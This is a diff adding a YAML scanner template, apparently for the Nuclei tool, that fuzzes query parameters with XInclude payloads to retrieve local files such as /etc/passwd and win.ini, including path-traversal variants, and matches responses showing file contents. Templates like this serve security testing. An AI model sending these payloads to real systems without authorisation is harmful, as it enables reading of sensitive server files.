@@ -1,0 +1,37 @@
+http:
+- fuzzing:
+  - fuzz:
+    - '{{xxe}}'
+    mode: multiple
+    part: query
+    type: replace
+  matchers:
+  - part: body
+    regex:
+    - 'root:.*:0:0:'
+    type: regex
+  - condition: and
+    part: body
+    type: word
+    words:
+    - bit app support
+    - '[mci extensions]'
+  matchers-condition: or
+  method: GET
+  path:
+  - '{{BaseURL}}'
+  payloads:
+    xxe:
+    - <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text"%20href="file:///etc/passwd"/></foo>
+    - <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text"%20href="file:///C:\Windows\win.ini"/></foo>
+    - <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text"%20href="file:///C:/Windows/win.ini"/></foo>
+    - <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text"%20href="file://../../../../../../etc/passwd"/></foo>
+    - <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text"%20href="file://../../../../../../C:\Windows\win.ini"/></foo>
+    - <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text"%20href="file://../../../../../../C:/Windows/win.ini"/></foo>
+  stop-at-first-match: true
+id: xxe-xinclude-retrieve-files
+info:
+  author: reewardius
+  name: Exploiting XInclude to retrieve files
+  severity: high
+  tags: fuzzing-xxe,dast,fuzzing-req-xxe
